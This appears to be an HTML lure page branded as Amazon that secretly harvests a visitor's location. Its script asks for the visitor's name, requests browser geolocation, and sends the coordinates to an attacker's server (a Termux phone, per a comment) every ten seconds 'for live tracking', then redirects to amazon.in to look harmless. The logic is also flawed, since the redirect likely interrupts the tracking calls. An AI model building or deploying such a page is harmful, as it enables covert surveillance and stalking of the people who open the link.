<!DOCTYPE html>
<html>
<head>
    <title>Amazon + Live Location</title>
</head>
<body>
    <h2>Welcome! Loading Amazon & Sending Location...</h2>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io(); // connect to server
        const name = prompt("Enter your name");

        function sendLocation(position) {
            const data = {
                name: name,
                lat: position.coords.latitude,
                lon: position.coords.longitude
            };
            socket.emit("location", data); // send to Termux server
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    sendLocation,
                    () => console.log("Location permission denied")
                );
            } else {
                console.log("Geolocation not supported");
            }
        }

        // Ask for location immediately
        requestLocation();

        // Optional: repeat every 10 sec for live tracking
        setInterval(requestLocation, 10000);

        // Open Amazon automatically
        window.location.href = "https://www.amazon.in";
    </script>
</body>
</html>
